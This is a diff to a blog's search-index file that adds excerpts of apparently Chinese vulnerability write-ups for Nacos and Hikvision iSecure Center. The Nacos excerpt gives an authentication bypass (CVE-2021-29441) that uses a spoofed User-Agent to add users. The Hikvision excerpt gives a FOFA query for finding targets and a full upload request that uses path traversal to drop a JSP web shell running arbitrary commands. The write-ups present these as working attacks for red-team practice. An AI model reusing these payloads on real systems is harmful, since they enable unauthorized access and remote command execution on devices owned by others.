@@ -161,9 +161,15 @@ var store = [{
         "url": "/vul/ueditor/",
         "teaser": null
       },{
-        "title": "Nacos身份认证绕过漏洞",
+        "title": "CVE-2021-29441 - Nacos身份认证绕过漏洞",
         "excerpt":"Nacos身份认证绕过漏洞  0x00 漏洞概述  Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。User-Agent为Nacos-Server时可绕过认证，添加新用户。   0x01 POC  添加User-Agent: Nacos-Server后访问http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9可以看到返回值为200,且内容中是否包含pageItems      0x02 漏洞利用  添加User-Agent: Nacos-Server后使用POST方法请求                         http://target:8848/nacos/v1/auth/users?username=yyj&amp;password=yyj 添加一个新用户      用创建的用户名和密码成功登录后台     ","categories": ["vul"],
         "tags": ["nacos","nday","web","unserialize"],
         "url": "/vul/nacos/",
+        "teaser": null
+      },{
+        "title": "Hikvision综合安防管理平台文件上传",
+        "excerpt":"想要成为红队大佬，复现漏洞少不了 fofa查询语句：icon_hash=\"-808437027\" &amp;&amp; app=\"HIKVISION-iSecure-Center\" 如果凭拼接/center/api/files;.js后如下图响应，则漏洞很大可能存在 上传木马 POST /center/api/files;.js HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 539 Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4 --e54e7e5834c8c50e92189959fe7227a4 Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp\" Content-Type: application/octet-stream &lt;% if(\"yueyejian\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"&lt;pre&gt;\"); while((a=in.read(b))!=-1){ out.println(new String(b)); }...","categories": ["vul"],
+        "tags": ["hikvision","nday","web"],
+        "url": "/vul/hikvision/",
         "teaser": null
       }]
